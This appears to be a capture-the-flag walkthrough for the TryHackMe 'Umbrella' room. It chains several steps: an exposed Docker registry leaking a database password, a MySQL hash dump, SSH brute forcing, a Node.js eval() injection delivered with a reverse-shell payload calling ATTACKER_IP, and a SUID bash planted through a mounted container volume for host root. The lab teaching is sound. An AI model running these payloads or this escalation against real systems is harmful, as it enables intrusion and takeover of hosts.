---
title: "Umbrella CTF"
image: /room_image.webp
categories: [CTFs ,Tryhackme]
tags: [Docker, database, sql, hash, RCE, pivot, suid, ]
media_subpath: /images/umbrella-ctf
author: <author_id>
---
During our assessment of **Umbrella**'s infrastructure, we identified an exposed **Docker** registry that allowed unauthorized access. Through this, we extracted **database credentials** and leveraged them to establish a connection to the database. After dumping the **password hashes**, we successfully cracked them and utilized the recovered credentials to gain an **SSH shell** on the target system.

Further enumeration revealed a containerized web application with a volume mounted to the host. By analyzing the application’s source code within the container, we identified and exploited a **remote code execution** (RCE) vulnerability, escalating our privileges to a root shell within the container. To **pivot** further, we exploited the mounted host volume by crafting a custom **SUID** binary from within the container. Executing this binary on the host system provided a root-level shell, effectively compromising the host machine.


## **Enumeration - Nmap Scan**

```console
$ nmap -sC -sV -Pn -p- -n -v -T4 10.10.165.140
....
Discovered open port 22/tcp on 10.10.165.140
Discovered open port 3306/tcp on 10.10.165.140
Discovered open port 8080/tcp on 10.10.165.140
Discovered open port 5000/tcp on 10.10.165.140
....
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql   MySQL 5.7.40
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsLoadDataLocal, SupportsTransactions, InteractiveClient, FoundRows, ConnectWithDatabase, IgnoreSigpipes, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, LongPassword, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: >TEfQG9&c
| \x14*#>(qps'/
|_  Auth Plugin Name: mysql_native_password
5000/tcp open  http    Docker Registry (API: 2.0)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title.
8080/tcp open  http    Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Login

```

### **Open Ports**

| Ports | Services | Version             |
| ----- | -------- | ------------------- |
| 22    | SSH      | OpenSSH 8.2  Ubuntu |
| 3306  | mysql    | MySQL 5.7.40        |
| 5000  | http     | Docker Registry     |
| 8080  | http     | Node.js             |

## Overview of services

```
10.10.165.140   umbrella.thm
```
{: file=/etc/hosts}

### port 5000
Port 5000 returns an empty HTTP response.

```console 
gobuster dir -u http://umbrella.thm:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://umbrella.thm:5000
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/v2                   (Status: 301) [Size: 39] [--> /v2/]
...
```

![Desktop View](/port-5000-v2.webp){: width="1200" height="450" }

### port 8080

![Desktop View](/port-8080.webp){: width="1200" height="450" }

>I was not able to bypass the login, and directory fuzzing did not find anything useful. So, I went back to the Docker registry.
{: .prompt-tip}


## FootHold

### **Enumerating the Docker Registry**

```console
$ curl -s http://umbrella.thm:5000/v2/_catalog | jq
{
  "repositories": [
    "umbrella/timetracking"
  ]
}
```
1. there are one repository : umbrella/timetracking

```console
$ curl -s http://umbrella.thm:5000/v2/umbrella/timetracking/tags/list | jq
{
  "name": "umbrella/timetracking",
  "tags": [
    "latest"
  ]
}

```
2. there are on tag : latest

### **Database Credentials**

```console 
$ curl -s http://umbrella.thm:5000/v2/umbrella/timetracking/manifests/latest | jq 
    {
    "v1Compatibility": "{\"id\":\"a736d9865b752b4c30c68719d04b5f5e404bd9302ab81a451a2b6679901ee50d\",\"parent\":\"15da84a53f8e99c1b070fa72a863ba37ccfd70e0df889ff4a8b03f935e03e98b\",\"created\":\"2022-12-22T10:02:11.849073942Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV DB_DATABASE=timetracking\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"15da84a53f8e99c1b070fa72a863ba37ccfd70e0df889ff4a8b03f935e03e98b\",\"parent\":\"1b554b4528b3ad29a93acfab26b606a4c35c1578d23de83af30dac456324f341\",\"created\":\"2022-12-22T10:02:11.638209337Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"1b554b4528b3ad29a93acfab26b606a4c35c1578d23de83af30dac456324f341\",\"parent\":\"8b227f4d6cab8d95100554ab36684fc95ba5e1b28bf701351a70bf163a0835f6\",\"created\":\"2022-12-22T10:02:11.442849337Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV DB_USER=root\"]},\"throwaway\":true}"
    }
    ......
    ......
```
ENV DB_DATABASE=timetracking
ENV DB_PASS=**************
ENV DB_USER=root

```console
$mysql -u root -p -h umbrella.thm
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3
Server version: 5.7.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

----


```console
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| timetracking       |
+--------------------+
5 rows in set (0.00 sec)

mysql> use timetracking; 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------+
| Tables_in_timetracking |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)

mysql> select * from users ;
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| cl****-r | 2ac9********************8e549b63 |   360 |
| ch***-r  | 0d10*********************1e9e9b7 |   420 |
| j***-v   | d5c0*********************3992ac8 |   564 |
| bar***b  | 4a048**********************7e994 | 47893 |
+----------+----------------------------------+-------+
4 rows in set (0.00 sec)


```

![Desktop View](/ps-hash.webp){: width="1200" height="450" }

### Brute Force SSH

```console
$ hydra -L usernames -P passwords ssh://umbrella.thm
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-23 21:19:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking ssh://umbrella.thm:22/
[22][ssh] host: umbrella.thm   login: c****-r   password: ******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-23 21:19:21
```
### **The shell**

```console
$ ssh cl***-r@umbrella.thm
....
....
claire-r@umbrella.thm's password: 
....
....

claire-r@ctf:~$ ls
timeTracker-src  user.txt
claire-r@ctf:~$ cat user.txt 
THM{************************}
claire-r@ctf:~$ 
```
### docker file

```console
claire-r@ctf:~/timeTracker-src$ cat docker-compose.yml 
version: '3.3'
services:
  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: 'timetracking'
      MYSQL_ROOT_PASSWORD: 'Ng1-f3!Pe7-e5?Nf3xe5'
    ports:
      - '3306:3306'     
    volumes:
      - ./db:/docker-entrypoint-initdb.d
  app:
    image: umbrella/timetracking:latest
    restart: always
    ports:
      - '8080:8080'
    volumes:
      - ./logs:/logs

```
> Examining the docker compose file, we notice /home/claire-r/timeTracker-src/logs is mounted inside the web application container at /logs so if we login as root in docker so we can ...
{: .prompt-info}

## Root in Docker 

### enumerate app.js

```console
/timeTracker-src$ cat docker-compose.yml
....
....
// http://localhost:8080/time
app.post('/time', function(request, response) {
	
    if (request.session.loggedin && request.session.username) {

        let timeCalc = parseInt(eval(request.body.time));
		let time = isNaN(timeCalc) ? 0 : timeCalc;
        let username = request.session.username;

		connection.query("UPDATE users SET time = time + ? WHERE user = ?", [time, username], function(error, results, fields) {
			if (error) {
				log(error, "error")
			};

			log(`${username} added ${time} minutes.`, "info")
			response.redirect('/');
		});
	} else {
        response.redirect('/');;	
    }
	
});
....
....
```

> let timeCalc = parseInt(eval(request.body.time)); eval function it executes arbitrary code
{: .prompt-danger}

### the Reverse Shell Malware

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(RPORT, "ATTACKER_IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

![Desktop View](/login-port-8080-claire.webp){: width="1200" height="450" }

### stabilizing our shell

```console
/usr/bin/script -qc /bin/bash /dev/null
root@de0610f51845:/usr/src/app# export TERM=xterm
export TERM=xterm
root@de0610f51845:/usr/src/app# ^Z
[1]+  Stopped                 nc -lvnp 9002
$ stty raw -echo; fg
nc -lvnp 9002

root@de0610f51845:/usr/src/app# id
uid=0(root) gid=0(root) groups=0(root)
```
## The Shell Root

### Creating a SUID binary inside /logs

Copying the /bin/bash inside /home/claire-r/timeTracker-src/logs from the host.

```console
claire-r@ctf:~/timeTracker-src/logs$ cp /bin/bash .
```
From the container, changing the owner for bash binary to root and setting the suid bit.

```console
root@de0610f51845:/logs# chown root:root bash
root@de0610f51845:/logs# chmod 4777 bash
```
Now we have a bash binary with suid bit set.

```console
claire-r@ctf:~/timeTracker-src/logs$ ls -la 
total 1168
drwxrw-rw- 2 claire-r claire-r    4096 Jan 19 23:36 .
drwxrwxr-x 6 claire-r claire-r    4096 Dec 22  2022 ..
-rwsrwxrwx 1 root     root     1183448 Jan 19 23:36 bash
-rw-r--r-- 1 root     root         130 Jan 19 23:30 tt.log
```

### Get the shell

```console
claire-r@ctf:~/timeTracker-src/logs$ ./bash -p
bash-5.0# id
uid=1001(claire-r) gid=1001(claire-r) euid=0(root) groups=1001(claire-r)
bash-5.0# wc -c /root/root.txt
38 /root/root.txt
```